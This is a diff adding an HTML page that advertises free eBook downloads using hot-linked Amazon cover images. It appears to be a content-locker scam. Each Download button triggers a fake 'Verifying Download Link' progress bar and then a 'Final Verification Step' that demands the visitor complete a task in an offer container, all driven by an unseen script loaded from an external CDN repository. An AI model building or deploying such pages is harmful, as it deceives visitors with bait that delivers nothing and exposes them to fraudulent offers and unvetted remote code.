@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Download eBook Library</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/s.css" />
+</head>
+<body>
+
+    <div id="library-grid">
+        <div class="book-item">
+            <div class="free-tag">FREE</div>
+            <img src="https://m.media-amazon.com/images/I/51xFIML-7lL._SY445_SX342_QL70_FMwebp_.jpg" class="book-img">
+            <button class="btn-dl" onclick="runLoader()">Download</button>
+        </div>
+        
+        <div class="book-item">
+            <div class="free-tag">FREE</div>
+            <img src="https://m.media-amazon.com/images/I/91NgznS-d5L._SL1500_.jpg" class="book-img">
+            <button class="btn-dl" onclick="runLoader()">Download</button>
+        </div>
+
+        <div class="book-item">
+            <div class="free-tag">FREE</div>
+            <img src="https://m.media-amazon.com/images/I/71QLI1OntqL._SL1500_.jpg" class="book-img">
+            <button class="btn-dl" onclick="runLoader()">Download</button>
+        </div>
+        <div class="book-item">
+            <div class="free-tag">FREE</div>
+            <img src="https://m.media-amazon.com/images/I/81K9E2AyfjL._SL1500_.jpg" class="book-img">
+            <button class="btn-dl" onclick="runLoader()">Download</button>
+        </div>
+              <div class="book-item">
+            <div class="free-tag">FREE</div>
+            <img src="https://m.media-amazon.com/images/I/81CW+q8LJBL._SL1500_.jpg" class="book-img">
+            <button class="btn-dl" onclick="runLoader()">Download</button>
+        </div>
+
+        <div class="book-item">
+            <div class="free-tag">FREE</div>
+            <img src="https://m.media-amazon.com/images/I/71PjIDe6FLL._SL1500_.jpg" class="book-img">
+            <button class="btn-dl" onclick="runLoader()">Download</button>
+        </div>
+    </div>
+
+    <div id="loading-ui">
+        <div style="font-weight:700; color:#0056b3; font-size: 18px;">Verifying Download Link...</div>
+        <div class="p-container"><div class="p-bar" id="pBar"></div></div>
+    </div>
+
+    <div id="locker-ui">
+        <div id="my-locker-header"></div>
+        <div class="instruction-text">
+            <b>Final Verification Step</b><br><br>
+            Complete one simple task below to verify your session. <br><br>
+            <b>Your download will start automatically upon completion.</b>
+        </div>
+        <div id="offerContainer"></div>
+    </div>
+<script src="https://cdn.jsdelivr.net/gh/monorolls/gsn@main/2.js"></script>
+</body>
+</html>
